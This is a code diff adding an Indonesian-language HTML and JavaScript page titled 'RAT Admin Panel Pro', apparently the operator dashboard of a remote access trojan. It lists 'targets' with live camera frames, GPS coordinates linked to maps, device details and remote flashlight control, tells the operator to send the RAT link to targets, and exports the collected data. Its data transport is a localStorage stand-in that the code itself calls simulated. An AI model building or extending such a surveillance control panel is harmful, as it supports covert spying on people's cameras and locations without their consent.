@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎯 RAT Admin Panel | Live Monitoring</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0e27;
+            color: #fff;
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(135deg, #1a1f3a 0%, #0a0e27 100%);
+            padding: 25px 30px;
+            border-bottom: 1px solid rgba(102,126,234,0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo p { font-size: 11px; color: #6c7293; }
+        .stats-badge {
+            background: rgba(102,126,234,0.2);
+            padding: 8px 16px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        .stats-badge .number { font-size: 24px; font-weight: 800; color: #667eea; }
+        .stats-badge .label { font-size: 10px; color: #8b8fb0; }
+        .dashboard { max-width: 1400px; margin: 30px auto; padding: 0 30px; }
+        .quick-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(102,126,234,0.2);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        .stat-card:hover { border-color: #667eea; transform: translateY(-3px); }
+        .stat-card .value { font-size: 36px; font-weight: 800; color: #667eea; }
+        .stat-card .title { font-size: 12px; color: #8b8fb0; margin-top: 5px; }
+        .action-bar {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+        }
+        .action-btn {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(102,126,234,0.2);
+            padding: 10px 18px;
+            border-radius: 10px;
+            color: #fff;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .action-btn:hover { background: rgba(102,126,234,0.2); }
+        .action-btn.danger:hover { background: rgba(220,53,69,0.2); border-color: #dc3545; }
+        .target-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 25px;
+        }
+        .target-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(102,126,234,0.2);
+            border-radius: 24px;
+            overflow: hidden;
+            animation: fadeIn 0.3s ease;
+            transition: all 0.3s;
+        }
+        .target-card.new {
+            animation: pulse 0.5s ease;
+            border-color: #667eea;
+            box-shadow: 0 0 20px rgba(102,126,234,0.3);
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.98); border-color: #667eea; }
+            100% { transform: scale(1); border-color: rgba(102,126,234,0.2); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .card-header {
+            padding: 18px 20px;
+            background: rgba(102,126,234,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .target-name {
+            font-weight: 700;
+            color: #667eea;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .target-time { font-size: 11px; color: #8b8fb0; }
+        .card-body { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
+        .live-cam {
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            position: relative;
+        }
+        .live-cam img, .live-cam video {
+            width: 100%;
+            background: #000;
+            min-height: 200px;
+            object-fit: cover;
+        }
+        .cam-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #dc3545;
+            padding: 4px 8px;
+            border-radius: 8px;
+            font-size: 10px;
+            font-weight: bold;
+            animation: blinkRed 1s infinite;
+        }
+        @keyframes blinkRed {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 13px;
+        }
+        .info-label { color: #8b8fb0; }
+        .info-value { color: #fff; font-weight: 500; }
+        .torch-control {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .remote-btn {
+            background: #667eea;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            flex: 1;
+        }
+        .remote-btn.torch { background: #ff9800; }
+        .remote-btn.danger { background: #dc3545; }
+        .location-link {
+            color: #667eea;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .empty-state {
+            text-align: center;
+            padding: 80px 20px;
+            color: #8b8fb0;
+        }
+        .empty-state .icon { font-size: 80px; margin-bottom: 20px; opacity: 0.5; }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            padding: 12px 20px;
+            border-radius: 12px;
+            color: white;
+            font-weight: 500;
+            z-index: 1000;
+            animation: slideInRight 0.3s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        @keyframes slideInRight {
+            from { opacity: 0; transform: translateX(100%); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        @media (max-width: 768px) {
+            .target-grid { grid-template-columns: 1fr; }
+            .dashboard { padding: 0 15px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="header-content">
+        <div class="logo">
+            <h1>🎯 RAT Admin Panel Pro</h1>
+            <p>Live Monitoring | Real-time Control</p>
+        </div>
+        <div class="stats-badge">
+            <div class="number" id="onlineCount">0</div>
+            <div class="label">Target Online</div>
+        </div>
+    </div>
+</div>
+
+<div class="dashboard">
+    <div class="quick-stats">
+        <div class="stat-card"><div class="value" id="statTotal">0</div><div class="title">Total Target</div></div>
+        <div class="stat-card"><div class="value" id="statCamera">0</div><div class="title">Kamera Live</div></div>
+        <div class="stat-card"><div class="value" id="statLocation">0</div><div class="title">Lokasi</div></div>
+        <div class="stat-card"><div class="value" id="statTorch">0</div><div class="title">Senter Aktif</div></div>
+    </div>
+
+    <div class="action-bar">
+        <button class="action-btn" onclick="refreshData()">🔄 Refresh Data</button>
+        <button class="action-btn" onclick="exportAllData()">📥 Export JSON</button>
+        <button class="action-btn danger" onclick="clearAllData()">🗑️ Hapus Semua</button>
+    </div>
+
+    <div id="targetsGrid" class="target-grid">
+        <div class="empty-state">
+            <div class="icon">📭</div>
+            <h3>Belum Ada Target</h3>
+            <p>Kirim link RAT ke target untuk memulai monitoring</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    let allTargets = [];
+    let lastTargetCount = 0;
+    let refreshInterval = null;
+
+    // Load data dari localStorage (sync dari target)
+    function loadData() {
+        const stored = localStorage.getItem('rat_targets_live');
+        if(stored) {
+            allTargets = JSON.parse(stored);
+        } else {
+            allTargets = [];
+        }
+        
+        // Update stats
+        document.getElementById('statTotal').innerText = allTargets.length;
+        document.getElementById('statCamera').innerText = allTargets.filter(t => t.cameraLive).length;
+        document.getElementById('statLocation').innerText = allTargets.filter(t => t.location).length;
+        document.getElementById('statTorch').innerText = allTargets.filter(t => t.flash).length;
+        document.getElementById('onlineCount').innerText = allTargets.filter(t => {
+            const lastUpdate = new Date(t.lastUpdate);
+            return (new Date() - lastUpdate) < 10000;
+        }).length;
+        
+        renderTargets();
+        
+        // Notifikasi target baru
+        if(allTargets.length > lastTargetCount) {
+            const newCount = allTargets.length - lastTargetCount;
+            showNotification(`🎯 ${newCount} target baru terhubung! Total: ${allTargets.length} device`);
+            lastTargetCount = allTargets.length;
+        }
+    }
+    
+    // Render semua target
+    function renderTargets() {
+        const container = document.getElementById('targetsGrid');
+        if(!allTargets.length) {
+            container.innerHTML = `
+                <div class="empty-state">
+                    <div class="icon">📭</div>
+                    <h3>Belum Ada Target</h3>
+                    <p>Kirim link RAT ke target untuk mulai monitoring</p>
+                </div>
+            `;
+            return;
+        }
+        
+        // Urutkan dari yang terbaru
+        const sorted = [...allTargets].reverse();
+        
+        container.innerHTML = sorted.map((target, idx) => `
+            <div class="target-card" id="card-${target.id}">
+                <div class="card-header">
+                    <div class="target-name">
+                        📱 ${target.deviceName || target.id.substring(0, 20)}
+                    </div>
+                    <div class="target-time">🕐 ${target.waktu || new Date(target.timestamp).toLocaleString()}</div>
+                </div>
+                <div class="card-body">
+                    <div class="live-cam">
+                        ${target.cameraLiveFrame ? 
+                            `<img src="${target.cameraLiveFrame}" alt="Live cam" style="width:100%;" id="cam-${target.id}">` :
+                            `<div style="background:#111; padding:40px; text-align:center; color:#666;">📷 Kamera tidak aktif</div>`
+                        }
+                        ${target.cameraLive ? '<div class="cam-badge">🔴 LIVE</div>' : ''}
+                    </div>
+                    
+                    <div class="info-row">
+                        <span class="info-label">🆔 ID Target:</span>
+                        <span class="info-value">${target.id}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">🌐 Device Info:</span>
+                        <span class="info-value">${target.screenSize || '?'} | ${target.language || '?'}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">📍 Lokasi:</span>
+                        <span class="info-value">
+                            ${target.location ? 
+                                `<a href="https://www.google.com/maps?q=${target.location.lat},${target.location.lng}" target="_blank" class="location-link">
+                                    🗺️ ${target.location.lat.toFixed(4)}, ${target.location.lng.toFixed(4)}
+                                </a>` : 
+                                'Tidak tersedia'}
+                        </span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">⚡ Status Senter:</span>
+                        <span class="info-value" id="torch-status-${target.id}">
+                            ${target.flash ? '🔦 Menyala' : '💡 Mati'}
+                        </span>
+                    </div>
+                    
+                    <div class="torch-control">
+                        <button class="remote-btn torch" onclick="remoteTorch('${target.id}', true)">🔦 Nyalakan Senter</button>
+                        <button class="remote-btn" onclick="remoteTorch('${target.id}', false)">💡 Matikan Senter</button>
+                    </div>
+                </div>
+            </div>
+        `).join('');
+    }
+    
+    // Remote control senter (simulasi via localStorage signaling)
+    function remoteTorch(targetId, turnOn) {
+        // Kirim sinyal ke target melalui localStorage
+        const signalKey = `torch_signal_${targetId}`;
+        localStorage.setItem(signalKey, JSON.stringify({ on: turnOn, time: Date.now() }));
+        setTimeout(() => localStorage.removeItem(signalKey), 2000);
+        
+        // Update tampilan local
+        const torchStatusSpan = document.getElementById(`torch-status-${targetId}`);
+        if(torchStatusSpan) {
+            torchStatusSpan.innerHTML = turnOn ? '🔦 Menyala (remote)' : '💡 Mati (remote)';
+        }
+        
+        showNotification(`⚡ Perintah senter ${turnOn ? 'MENYALA' : 'MATI'} dikirim ke target`);
+        
+        // Cari target dan update data
+        const target = allTargets.find(t => t.id === targetId);
+        if(target) {
+            target.flash = turnOn;
+            localStorage.setItem('rat_targets_live', JSON.stringify(allTargets));
+        }
+    }
+    
+    // Notifikasi
+    function showNotification(msg) {
+        const notif = document.createElement('div');
+        notif.className = 'notification';
+        notif.innerHTML = msg;
+        document.body.appendChild(notif);
+        setTimeout(() => notif.remove(), 4000);
+    }
+    
+    function refreshData() {
+        loadData();
+        showNotification('🔄 Data berhasil di-refresh');
+    }
+    
+    function exportAllData() {
+        const dataStr = JSON.stringify(allTargets, null, 2);
+        const blob = new Blob([dataStr], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `rat_targets_${new Date().toISOString()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showNotification('📥 Data di-export');
+    }
+    
+    function clearAllData() {
+        if(confirm('⚠️ PERINGATAN! Yakin hapus SEMUA data target? ⚠️')) {
+            localStorage.removeItem('rat_targets_live');
+            loadData();
+            showNotification('🗑️ Semua data telah dihapus');
+        }
+    }
+    
+    // Auto refresh setiap 3 detik
+    loadData();
+    refreshInterval = setInterval(loadData, 3000);
+    
+    // Listen storage events dari target
+    window.addEventListener('storage', (e) => {
+        if(e.key === 'rat_targets_live') {
+            loadData();
+            showNotification('📡 Update data target!');
+        }
+    });
+</script>
+</body>
+</html>
